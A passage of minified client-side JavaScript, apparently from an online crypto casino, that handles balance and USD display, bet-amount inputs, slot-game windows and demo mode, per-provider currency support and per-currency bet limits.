            let s = document.getElementsByClassName("balance-filter__input")[0].value;
            if (s.length > 0) {
                let e = s.toUpperCase();
                t = arrayUsd.filter((t => -1 != t[0].indexOf(e)))
            }
        } else {
            t = stFiat ? arrayCurrencyFiat : arrayCurrency, 1 == stBalUsd && (t = t.map((e => {
                let t = [e[0], e[1]];
                return "JET" != e[0] && "CANDY" != e[0] && (t = [e[0], window.truncatorJet(Number(e[1]) / Number(listCurs.data.rates[e[0]]), 8)]), t
            }))), arrayUsd = t;
            let e = document.getElementsByClassName("balance-filter__input")[0].value;
            if (e.length > 0) {
                let s = e.toUpperCase();
                t = arrayUsd.filter((e => -1 != e[0].indexOf(s)))
            }
        }
        let s = stFiat ? arrayCurrency : arrayCurrencyFiat;
        t = t.filter((e => -1 == s.findIndex((t => t[0] == e[0])))), fillBalHead(t)
    },
    gIC789 = (e, t) => {
        let s = document.getElementById(e);
        if (s) {
            let e = document.getElementById(t),
                a = (Number(s.value) / Number(listCurs.data.rates[userBetCur])).toFixed(9);
            a = window.truncatorJet(a, 8), e && (e.innerHTML = a + "$")
        }
    },
    arrFuncsDol = [],
    setDolGame = e => {
        let t = document.getElementById("bet_amount11");
        if (document.getElementById("inp_count") && t) {
            if (2 == e) return t && (t.innerHTML = gameLanguage[lngGame]["Bet amount"]), 0 != arrFuncsDol.length && (window.controlCount = arrFuncsDol[0], window.setCount = arrFuncsDol[1], window.changeCount = arrFuncsDol[2], "crash" == gameName && (window.controlDouble = arrFuncsDol[3], window.setDouble = arrFuncsDol[4], window.changeDouble = arrFuncsDol[5])), void("crash" == gameName && (t = document.getElementById("bet_amount13"), t && (t.innerHTML = gameLanguage[lngGame]["Bet amount"])));
            0 == arrFuncsDol.length && (arrFuncsDol.push(window.controlCount.bind({})), arrFuncsDol.push(window.setCount.bind({})), arrFuncsDol.push(window.changeCount.bind({})), "crash" == gameName && (arrFuncsDol.push(window.controlDouble.bind({})), arrFuncsDol.push(window.setDouble.bind({})), arrFuncsDol.push(window.changeDouble.bind({})))), gIC789("inp_count", "bet_amount11");
            let s = arrFuncsDol[0];
            window.controlCount = e => {
                s(e), gIC789("inp_count", "bet_amount11")
            };
            let a = arrFuncsDol[1];
            window.setCount = e => {
                a(e), gIC789("inp_count", "bet_amount11")
            };
            let n = arrFuncsDol[2];
            if (window.changeCount = (e, t) => {
                    n(e, t), gIC789("inp_count", "bet_amount11")
                }, "crash" == gameName) {
                gIC789("inp_count13", "bet_amount13");
                let e = arrFuncsDol[3];
                window.controlDouble = t => {
                    e(t), gIC789("inp_count13", "bet_amount13")
                };
                let t = arrFuncsDol[4];
                window.setDouble = e => {
                    t(e), gIC789("inp_count13", "bet_amount13")
                };
                let s = arrFuncsDol[5];
                window.changeDouble = e => {
                    s(e), gIC789("inp_count13", "bet_amount13")
                }
            }
        }
    },
    getUSD = e => {
        stBalUsd = e, localStorage.setItem("modeUsd", stBalUsd);
        let t = [];
        if (1 == e) {
            let e = stFiat ? arrayCurrencyFiat : arrayCurrency;
            1 == stBal0 && (e = arrayUsd), t = e.map((e => {
                let t = [e[0], e[1]];
                if ("JET" != e[0] && "CANDY" != e[0]) {
                    let s = (Number(e[1]) / Number(listCurs.data.rates[e[0]])).toFixed(9);
                    t = [e[0], window.truncatorJet(s, betListCur.USD.precision)]
                }
                return t
            })), arrayUsd = t;
            let s = document.getElementsByClassName("balance-filter__input")[0].value;
            if (s.length > 0) {
                let e = s.toUpperCase();
                t = arrayUsd.filter((t => -1 != t[0].indexOf(e)))
            }
            1 == statusGameOPEN && setDolGame()
        } else {
            t = stFiat ? arrayCurrencyFiat : arrayCurrency, 1 == stBal0 && (t = t.filter((e => Number(e[1]) > 0))), arrayUsd = t;
            let e = document.getElementsByClassName("balance-filter__input")[0].value;
            if (e.length > 0) {
                let s = e.toUpperCase();
                t = arrayUsd.filter((e => -1 != e[0].indexOf(s)))
            }
            1 == statusGameOPEN && setDolGame(2)
        }
        let s = stFiat ? arrayCurrency : arrayCurrencyFiat;
        t = t.filter((e => -1 == s.findIndex((t => t[0] == e[0])))), fillBalHead(t);
        let a = document.getElementsByClassName("balance_cur_" + userBetCur)[0];
        if (a) chaBal({
            currentTarget: a
        }, 2);
        else {
            let e = document.getElementsByClassName("currencyBal11")[0].getElementsByClassName("font-digits")[0],
                t = "",
                s = arrayCurrencyFiat.find((e => e[0] == userBetCur));
            null == s && (s = arrayCurrency.find((e => e[0] == userBetCur))), s = s[1], 1 == stBalUsd ? (t = "$", s = (Number(s) / Number(listCurs.data.rates[userBetCur])).toFixed(9), s = window.truncatorCoins(s, 8), e.innerHTML = s + " " + t) : e.innerHTML = window.truncatorCoins(s, 8)
        }
    },
    changeToggle = (e, t) => {
        e.classList.contains("acitve") ? (e.classList.remove("acitve"), "000" == t && getCurs0(2), "usd" == t && getUSD(2), "email" == t && onEmail(0), "hide" == t && onHN(0)) : (e.classList.add("acitve"), "000" == t && getCurs0(1), "usd" == t && getUSD(1), "email" == t && onEmail(1), "hide" == t && onHN(1))
    },
    onHN = e => {
        let t = new FormData;
        t.set("action", "hideNick"), t.set("on_off", e), axios.post("/user/func.php", t).then((e => {})).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    },
    onEmail = e => {
        let t = new FormData;
        t.set("action", "sendMailPromo"), t.set("on_off", e), axios.post("/user/func.php", t).then((e => {})).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    },
    openGC = async (e, t, s, a, n, r, o, i, l, c) => {
        if (1 == stOpSe && closeSearch(), "undefined" == s) {
            if (2 == t) return isMobile() && closeChooseSlot(), void(!isMobile() || "Amatic" != l && 1 != stSlotNTaB ? openGameWindow(e, a, n, 0, c) : openGameMob(e));
            if (1 == t) {
                setTitlePage(a), document.cookie = `hrefBack99=${window.location.href}; max-age=31536000; path=/`;
                let t = o.getElementsByTagName("img")[0];
                t && (t = t.dataset.src), isMobile() ? (await openChooseSlot(o), chGamePl(e, a, n, o, !1, i, t, l)) : openGameWindow(e, a, n, o, t, i)
            }
        } else openGame(e)
    }, gameProvsCur = {
        zillion: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        wazdan: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        truelab: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        nolimit: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        habanero: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        gamzix: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        gamebeat: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        gameart: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        spribe: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        amatic: ["EUR", "AZN", "BDT", "BRL", "CAD", "CLP", "INR", "JPY", "KZT", "MYR", "NZD", "PEN", "RUB", "THB", "TRY", "UAH", "USD", "UZS"],
        bsg: ["EUR", "BRL", "CAD", "RUB", "UAH", "USD"],
        relax: ["EUR", "AZN", "BRL", "CAD", "CLP", "CNY", "IDR", "INR", "JPY", "KZT", "NGN", "NZD", "PHP", "RUB", "TRY", "VND", "UAH", "USD"],
        redgenn: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        softswiss: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        groove: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        yggdrasil: ["EUR", "AUD", "AZN", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        thunderkick: ["EUR", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        mascot: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        pushgaming: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "KES", "KZT", "NZD", "PEN", "PHP", "RUB", "THB", "VND", "UAH", "USD", "UZS"],
        quickspin: ["EUR", "AUD", "AZN", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        redtiger: ["EUR", "AZN", "BRL", "CAD", "CLP", "CNY", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NZD", "PEN", "RUB", "THB", "TRY", "VND", "UAH", "USD"],
        netent: ["EUR", "AUD", "AZN", "BRL", "CAD", "CLP", "CNY", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "UAH", "USD"],
        platipus: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "JPY", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"],
        playngo: ["EUR", "AUD", "AZN", "BDT", "BRL", "CAD", "CLP", "CNY", "GEL", "IDR", "INR", "KES", "KZT", "MYR", "NGN", "NZD", "PEN", "PHP", "RUB", "THB", "TRY", "VND", "UAH", "USD", "UZS"]
    }, gameProv11 = "", openChooseSlot = async e => {
        await modalOpenNew("modal_chooseSlot", "demoPlay");
        let t = document.getElementsByClassName("ig_img")[0];
        t.setAttribute("srcset", e.getElementsByTagName("img")[0].srcset), t = document.getElementsByClassName("ig_title")[0], t.innerHTML = e.getElementsByClassName("gn50")[0].innerHTML, t = document.getElementsByClassName("ig_prov")[0], t.innerHTML = e.getElementsByClassName("gp50")[0].innerHTML, gameProv11 = e.getElementsByTagName("img")[0].dataset.src, gameProv11 = String(gameProv11).split(":")[0], gameProv11 = String(gameProv11).toLocaleLowerCase(), t = document.getElementById("heart_mob");
        let s = document.getElementsByClassName("ig_fav5")[0];
        if (setDGWSl(), 1 == window.user_il) {
            s.style.display = "block";
            let a = e.getElementsByTagName("img")[0].dataset.src;
            checkFGs(a) ? t.classList.remove("active") : t.classList.add("active"), t.onclick = e => {
                chGames(a, e)
            }
        } else s.style.display = "none";
        let a = document.getElementsByClassName("modal_chooseSlot")[0],
            n = gC("game_game_txt")[0];
        if (n && (n = n.getElementsByTagName("span")[0]), gameProvsCur[gameProv11]) {
            let e = gameProvsCur[gameProv11].find((e => e == userBetCur));
            null == e && (e = "USD"), n && (n.innerHTML = e)
        } else n && (n.innerHTML = "USD");
        a.classList.add("active"), errFixCoins()
    }, closeChooseSlot = () => {
        let e = document.getElementsByClassName("modal_chooseSlot")[0];
        e && e.classList.remove("active");
        let t = window.location.href.split("?gamelink")[1];
        null != t && closeHistory("?gamelink" + t), errUnFixCoins()
    }, openGameMob = e => {
        window.open(e, "_self")
    }, fullSizeJet = (e = !1, t) => {
        let s = document.getElementsByClassName("iframe_wr22")[0],
            a = gC("name-theteFR")[0];
        s && e && (e.classList.contains("active") ? (s.classList.remove("iframe73Full"), s.classList.remove("iframe73Teat"), e.classList.remove("active"), a && a.classList.add("active"), errUnFixCoins()) : (s.classList.add("iframe73Full"), a && a.classList.remove("aaaa"), s.classList.remove("iframe73Teat"), e.classList.add("active"), a && a.classList.remove("active"), errFixCoins())), e || (errUnFixCoins(), a && a.classList.add("active"), s.classList.remove("iframe73Full"), s.classList.remove("iframe73Teat")), s && t && (t.classList.contains("aaaa") ? (s.classList.remove("iframe73Teat"), t.classList.remove("aaaa")) : (s.classList.add("iframe73Teat"), t.classList.add("aaaa")))
    }, stSlotNTaB = 0, chooseModeGame = (e, t = 0) => {
        if (0 == t) {
            let t = document.getElementById("iframe_id117").getElementsByTagName("iframe")[0],
                s = t.getAttribute("src");
            if (t)
                if (e.classList.contains("active")) {
                    if (1 != window.user_il) return void openMobileLogin();
                    e.classList.remove("active"), document.cookie = "demoMode=0; path=/", t.src = s, gD("slInG1") && (gD("slInG1").style.display = "none"), gD("slInG2") && (gD("slInG2").style.display = "block")
                } else e.classList.add("active"), document.cookie = "demoMode=1; path=/", t.src = s, gD("slInG1") && (gD("slInG1").style.display = "block"), gD("slInG2") && (gD("slInG2").style.display = "none")
        } else e.classList.contains("active") ? (e.classList.remove("active"), stSlotNTaB = 0) : (e.classList.add("active"), stSlotNTaB = 1)
    };

function chGamePl(e, t, s, a = !1, n, r = !1, o = 0, i = 0) {
    let l = document.getElementsByClassName("btns_game_ch")[0];
    l = l.getElementsByTagName("button");
    let c = document.getElementsByClassName("game_av_txt")[0];
    r ? (Array.from(l).forEach((e => e.disabled = !0)), c.style.display = "block") : (Array.from(l).forEach((e => e.disabled = !1)), c.style.display = "none");
    let d = !1;
    d = a ? a.getElementsByTagName("img")[0].dataset.src : n, "slots-game" != pageNameM && (pageWG11 = pageNameM), document.getElementById("btn_sl_play").onclick = () => {
        if (1 != window.user_il) return isMobile() && closeChooseSlot(), void openMobileLogin();
        "CANDY" != userBetCur ? (d && chRGames(d), gD("slInG1") && (gD("slInG1").style.display = "none"), gD("slInG2") && (gD("slInG2").style.display = "block"), document.cookie = "demoMode=0; path=/", openGC(e, 2, "undefined", t, "1", 0, 0, 0, i, o)) : createNotifyL(1, "Currency CANDY only in original games.", lp.Error)
    };
    let u = document.getElementById("btn_sl_demo");
    u.onclick = () => {
        document.cookie = "demoMode=1; path=/", 1 == window.user_il && d && chRGames(d), openGC(e, 2, "undefined", t, "0", 0, 0, 0, i, o)
    }, u.style.display = 2 == s ? "none" : ""
}
async function openGameWindow(e, t, s = "0", a = !1, n = !1, r) {
    let o, i, l = !1;
    n ? i = n : (i = window.location.href.split("?gamelink=")[1], i = window.atob(i)), o = casinoGames.find((e => e[0] == i)), 2 != o[1].t && 0 != o[1].d || (s = 2), t = t.replaceAll("%20", " ");
    let c = document.getElementsByClassName("menu-item");
    Array.from(c).forEach((e => {
        e.classList.remove("select"), e.disabled = !1
    }));
    let d = document.getElementsByClassName("ieOgwV");
    Array.from(d).forEach((e => {
        e.style.display = "none"
    })), d = document.getElementsByClassName("game_wrapper")[0], d.classList.remove("sport_wrapper"), window.scrollTo(0, 0), d.innerHTML = "", d.style.display = "block";
    let u = e;
    if ("0" == s && (document.cookie = "demoMode=1; path=/"), a) {
        l = (await axios.get("/modals/demoPlay.php").catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))).data
    } else {
        let e = "";
        "4:3" == o[1].ar && (e = "apeckt43"), l = `<iframe src="${u}" class="${e}"  id="iframe-desc6" frameborder="0" vspace="0" hspace="0" marginwidth="0" marginheight="0" width="100%" height="100%" seamless="" allowfullscreen="" \n  style="visibility: visible; overflow: hidden;"  scrolling="no"></iframe>`
    }
    null == pageWG11 && (pageWG11 = "Home");
    let p = "0" == s ? "active" : "",
        m = "",
        f = "";
    if (2 != s && (f = `<div class="choose-mode">\n    <div class="name-game25">${lp["Demo game"]} </div>\n    <div onclick="chooseModeGame(this)" class="${p} ifOyIs switch">\n                    <div class="dot"></div>\n    </div>\n    </div>`), 1 == window.user_il) {
        let e = n;
        e || (e = curNumSlot), curNumSlot = n, m = `<svg id='heart_desk' onclick="chGames('${e}',event)" xmlns:xlink="http://www.w3.org/1999/xlink" class="heart_fav ${checkFGs(e)?"":"active"}">\n      <use xlink:href="#heart_fav"></use>\n      </svg>`
    }
    let h = `<div id="iframe_id117" class="iframe_wr22">\n    <div class="name-line">\n                        <div class="name-lineF">\n                          <button style="display: block; margin-right: 10px;background-color:#ffffff;border-radius: 50%;" \n                          onclick="window['open'+'${pageWG11}']();fullSizeJet(false)" data-v-0c03a553="" data-v-68ddf795="" type="button" class="button btn_back button_sm button_dark">\n                                      <i data-v-0c03a553="" data-v-68ddf795="">\n                                          <svg data-v-0c03a553="" data-v-68ddf795="" focusable="false" aria-hidden="true" class="">\n                                              <use data-v-ae06aca4="" data-v-68ddf795="" xlink:href="/assets/const/svg-sprite1.svg#icon-arrow">\n                                              </use>\n                          </svg></i> </button>    \n                        <div class="name-game">${t}</div>\n                        </div>\n                        <img loading="lazy" width="175" height="26" src="/assets/coins_d2.svg">\n                        <div class="name-lineFR">\n                            ${f}\n                            ${m}\n                            <div onclick="fullSizeJet(false,this)" class="name-theteFR active">\n                            <div class="theteFR_div">\n                            </div>\n                            </div>\n                            <div onclick="fullSizeJet(this)" class="name-closeFR">\n                            <img loading="lazy" src="/assets/fs.svg?x=55">\n                            </div>\n                            <div id='cross246' onclick="window['open'+'${pageWG11}']();fullSizeJet(false)" class="name-closeFR">\n                            <i class="modal_icon"></i>\n                            </div>\n                        </div>\n                    </div>\n    ${l}</div>`;
    if (d.innerHTML = h, a) {
        chGamePl(u, t, s, !1, n, r);
        let e = document.getElementsByClassName("modal_chooseSlot")[0];
        setDGWSl(), gameProv11 = String(o[0]).split(":")[0], gameProv11 = String(gameProv11).toLocaleLowerCase();
        let i = gC("game_game_txt")[0];
        if (i && (i = i.getElementsByTagName("span")[0]), gameProvsCur[gameProv11]) {
            let e = gameProvsCur[gameProv11].find((e => e == userBetCur));
            null == e && (e = "USD"), i && (i.innerHTML = e)
        } else i && (i.innerHTML = "USD");
        e.classList.remove("apeckt43"), "4:3" == o[1].ar && e.classList.add("apeckt43"), e = e.getElementsByClassName("modal_close_block")[0], e.onclick = !1, e.style.backgroundImage = "url(" + a.getElementsByTagName("img")[0].srcset.split(" ")[0] + ")"
    }
    if (n) {
        let e = window.btoa(n);
        openHistory(`?gamelink=${e}`, 2)
    }
    pageNameM = "slots-game"
}
let openBalance = e => {
    let t = document.getElementsByClassName("balance__dropdown")[0];
    if (t.addEventListener("click", (e => {
            e.preventDefault(), e.stopPropagation()
        })), "1" == e.dataset.open) {
        e.classList.remove("opened"), e.dataset.open = "2", t.style.display = "none", document.getElementsByClassName("balance-filter__input")[0].value = "", window.removeEventListener("click", openDesc12);
        let s = document.getElementsByClassName("balance_tg_wr")[0];
        s = s.getElementsByClassName("active")[0], curCCH(stFiat, s, 1)
    } else e.classList.add("opened"), t.style.display = "block", t.tabIndex = "1", t.focus(), e.dataset.open = "1", setTimeout((() => {
        window.addEventListener("click", openDesc12)
    }), 0)
};
window.truncatorNumb = function(e, t) {
    if (isNaN(Number(e))) return e;
    {
        let s = e.toString(),
            a = s.indexOf("."),
            n = -1 == a ? s.length : 1 + a + t,
            r = s.substr(0, n),
            o = isNaN(r) ? 0 : r;
        return o = parseFloat(o).toString(), -1 != o.indexOf("-") && (o = Number(o).toFixed(t)), o
    }
}, window.truncatorJet = function(e, t, s) {
    if (t = s || 8, isNaN(Number(e))) return e;
    {
        let a = Number(e).toFixed(9),
            n = a.indexOf("."),
            r = -1 == n ? a.length : 1 + n + t,
            o = a.substr(0, r),
            i = isNaN(o) ? 0 : o,
            l = parseFloat(i).toString(); - 1 != l.indexOf("-") && (l = Number(l).toFixed(t));
        let c, d = l.split(".")[1];
        if (d || (d = {
                length: 0
            }), d.length < t) {
            let e = t - d.length;
            0 == d.length && (l += ".");
            for (let t = 0; t < e; t++) l += "0"
        }
        return s || (c = l.length - 10), c > 0 && !s && (l = window.truncatorJet(e, t, 8 - c)), l
    }
}, window.truncatorCoins = function(e, t, s) {
    if (t = s || 8, isNaN(Number(e))) return e;
    {
        let a = e.toString(),
            n = a.indexOf("."),
            r = -1 == n ? a.length : 1 + n + t,
            o = a.substr(0, r),
            i = isNaN(o) ? 0 : o,
            l = parseFloat(i).toString(); - 1 != l.indexOf("-") && (l = Number(l).toFixed(t));
        let c, d = l.split(".")[1];
        if (d || (d = {
                length: 0
            }), d.length < t) {
            let e = t - d.length,
                a = "";
            s && (a = '<span class="un_nul">'), 0 == d.length && (s ? a += "." : l += ".");
            for (let t = 0; t < e; t++) s ? a += "0" : l += "0";
            s && (a += "</span>"), l += a
        }
        return s || (c = l.length - 10), (c > 0 || e < 10) && !s && (l = window.truncatorCoins(e, t, 8 - c)), l
    }
}, betListCur = {
    CLP: {
        min: 8.85,
        max: 61922700,
        precision: 2
    },
    mBTC: {
        precision: 4,
        min: 4e-4,
        max: 2e3
    },
    uBTC: {
        precision: 2,
        min: .39,
        max: 2e6
    },
    mLTC: {
        precision: 3,
        min: .159,
        max: 5e5
    },
    uLTC: {
        precision: 2,
        min: 158.85,
        max: 5e8
    },
    mETH: {
        precision: 3,
        min: .007,
        max: 2e4
    },
    uETH: {
        precision: 2,
        min: 6.13,
        max: 2e7
    },
    LTC: {
        precision: 8,
        min: 1588e-7,
        max: 500
    },
    BCH: {
        precision: 8,
        min: 518e-7,
        max: 200
    },
    ETH: {
        precision: 8,
        min: 61e-7,
        max: 200
    },
    USDC: {
        precision: 3,
        min: .01,
        max: 66e3
    },
    USDT: {
        precision: 3,
        min: .01,
        max: 65e3
    },
    DASH: {
        precision: 8,
        min: 3905e-7,
        max: 600
    },
    DOGE: {
        precision: 8,
        min: .1564823,
        max: 425e3
    },
    DOT: {
        precision: 8,
        min: .002361,
        max: 12570
    },
    SOL: {
        precision: 8,
        min: 5065e-7,
        max: 2650
    },
    MATIC: {
        precision: 8,
        min: .0180603,
        max: 92600
    },
    SHIB: {
        precision: 8,
        min: 1294.4983819,
        max: 7697956100
    },
    XRP: {
        precision: 8,
        min: .019978,
        max: 70005
    },
    BNB: {
        precision: 8,
        min: 466e-7,
        max: 160
    },
    ADA: {
        precision: 8,
        min: .0390854,
        max: 55e3
    },
    TRX: {
        precision: 8,
        min: .1280525,
        max: 95e4
    },
    DAI: {
        precision: 8,
        min: .0100015,
        max: 66e3
    },
    USD: {
        precision: 2,
        min: .01,
        max: 7e4
    },
    XMR: {
        precision: 8,
        min: 719e-7,
        max: 400
    },
    JET: {
        precision: 2,
        min: .01,
        max: 7e4
    },
    CANDY: {
        precision: 2,
        min: .01,
        max: 10
    },
    EUR: {
        precision: 2,
        min: .01,
        max: 7e4
    },
    RUB: {
        precision: 2,
        min: .1,
        max: 5e6
    },
    UAH: {
        precision: 2,
        min: .37,
        max: 2e6
    },
    BTC: {
        precision: 8,
        min: 4e-7,
        max: 2
    },
    INR: {
        precision: 2,
        min: .84,
        max: 35e4
    },
    THB: {
        precision: 2,
        min: .36,
        max: 2e6
    },
    KRW: {
        precision: 2,
        min: 13.31,
        max: 8e7
    },
    GEL: {
        precision: 2,
        min: .03,
        max: 7e4
    },
    UZS: {
        min: 1130,
        max: 79e4,
        precision: 2
    },
    KZT: {
        precision: 2,
        min: 4.63,
        max: 3e7
    },
    BDT: {
        min: 1.1,
        max: 7510620,
        precision: 2
    },
    KES: {
        min: 1.47,
        max: 9646e3,
        precision: 2
    },
    AZN: {
        precision: 2,
        min: .02,
        max: 15e4
    },
    NGN: {
        min: 7.6,
        max: 55135500,
        precision: 2
    },
    AMD: {
        precision: 2,
        min: 3.87,
        max: 3e7
    },
    CAD: {
        precision: 2,
        min: .01,
        max: 7e4
    },
    GBP: {
        precision: 2,
        min: .01,
        max: 7e4
    },
    NOK: {
        precision: 2,
        min: .01,
        max: 7e4
    },
    PLN: {
        precision: 2,
        min: .01,
        max: 25e4
    },
    CNY: {
        precision: 2,
        min: .11,
        max: 5e5
    },
    TRY: {
        precision: 2,
        min: .27,
        max: 1e6
    },
    JPY: {
        precision: 2,
        min: 1.48,
        max: 75e5
    },
    BRL: {
        precision: 2,
        min: .05,
        max: 35e4
    },
    PHP: {
        precision: 2,
        min: .58,
        max: 35e5
    },
    IDR: {
        min: 153.04,
        max: 1062558e3,
        precision: 2
    },
    VND: {
        min: 240.61,
        max: 165025e4,
        precision: 2
    },
    MYR: {
        min: .05,
        max: 303275,
        precision: 2
    },
    AUD: {
        precision: 2,
        min: .01,
        max: 7e4
    },
    PEN: {
        precision: 2,
        min: .04,
        max: 257800
    },
    NZD: {
        precision: 2,
        min: .01,
        max: 7e4
    },
    "": {
        precision: 2
    }
}, stChatEx = !0, pathChatG = "/apps/chat/", hrefReqGameAll = "https://jetgamescdn.com/apps/", topForChatGame = 60, topForChatGameMob = 53, gameTopForLineMob = 53, lng = "en", entryOptions = {}, lngGame = "en", publicChatGame = "pub_coins", gameName = "crash", userIDGame = "", urlSocketGame = "wss://kupi-konder.club/", userHASHGame = "", userBetCur = "", userBetCur1 = "", amountJetGame = "0.00";
let sportMobSt, bonusMobSt, referralsList, fixCorCoins = 0,
    errFixCoins = () => {
        fixCorBet = window.pageYOffset, window.scrollTo(0, 0);
        let e = document.getElementsByTagName("body")[0];
        e && e.classList.add("importantF"), e = document.getElementsByTagName("html")[0], e && (e.style.overflow = "hidden"), e = document.getElementById("home"), e && (e.style.top = "-" + fixCorBet + "px"), e && (e.style.marginBottom = "-" + fixCorBet + "px")
    },
    errUnFixCoins = () => {
        if (window.innerWidth < 451 && 2 == statusChatGame) return;
        let e = document.getElementsByTagName("body")[0];
        e && e.classList.remove("importantF"), e = document.getElementsByTagName("html")[0], e && (e.style.overflow = ""), e = document.getElementById("home"), e && (e.style.top = ""), e && (e.style.marginBottom = ""), window.scrollTo(0, fixCorBet);
        let t = [];
        swSl && t.push(swSl), swSl1 && t.push(swSl1), mySwiperBest && t.push(mySwiperBest), mySwiperLob1 && t.push(mySwiperLob1), mySwiperFor1 && t.push(mySwiperFor1), mySwiperLob2 && t.push(mySwiperLob2), mySwiperRec1 && t.push(mySwiperRec1), mySwiperFeat && t.push(mySwiperFeat), mySwiperFeat1 && t.push(mySwiperFeat1), mySwiperCas && t.push(mySwiperCas), mySwiperMain && t.push(mySwiperMain), mySwiperMSL2 && t.push(mySwiperMSL2), mySwiperMSL4 && t.push(mySwiperMSL4), mySwiperProv && t.push(mySwiperProv), t.forEach((e => e.update()))
    },
    arrCountryF = {
        IN: "INR",
        CL: "CLP",
        AZ: "AZN",
        RU: "RUB",
        TR: "TRY",
        MY: "MYR",
        GE: "GEL",
        CN: "CNY",
        UZ: "UZS",
        BR: "BRL",
        CA: "CAD",
        JP: "JPY",
        TH: "THB",
        BD: "BDT",
        KE: "KES",
        UA: "UAH",
        KZ: "KZT",
        ID: "IDR",
        NG: "NGN",
        PH: "PHP",
        AT: "EUR",
        BE: "EUR",
        BG: "EUR",
        CZ: "EUR",
        DE: "EUR",
        DK: "EUR",
        EE: "EUR",
        ES: "EUR",
        FI: "EUR",
        FR: "EUR",
        GR: "EUR",
        HU: "EUR",
        IE: "EUR",
        IT: "EUR",
        LT: "EUR",
        LU: "EUR",
        LV: "EUR",
        NL: "EUR",
        NO: "EUR",
        PL: "EUR",
        PT: "EUR",
        RO: "EUR",
        SE: "EUR",
        SI: "EUR",
        SK: "EUR"
    },
    opListCur = e => {
        let t = document.getElementsByClassName("dw_listcur" + e)[0];
        t.style.display = "block", t = document.getElementsByClassName("opListCur" + e)[0], t.style.display = "none";
        let s = document.getElementsByClassName("modal_deposite")[0];
        s.classList.remove("opMon2"), s.classList.remove("opMonD"), s.classList.remove("opMoni"), isMobile() || s.classList.add("opMonD"), isMobile() || s.classList.add("opMoni");
        let a = document.getElementsByClassName("dwc_item");
        Array.from(a).forEach((e => {
            e.classList.remove("actives")
        })), changeDW(3, e)
    },
    listCurSel = (e, t, s, a) => {
        gD("with_amount").value = "";
        let n = document.getElementsByClassName("dw_listcur" + t)[0];
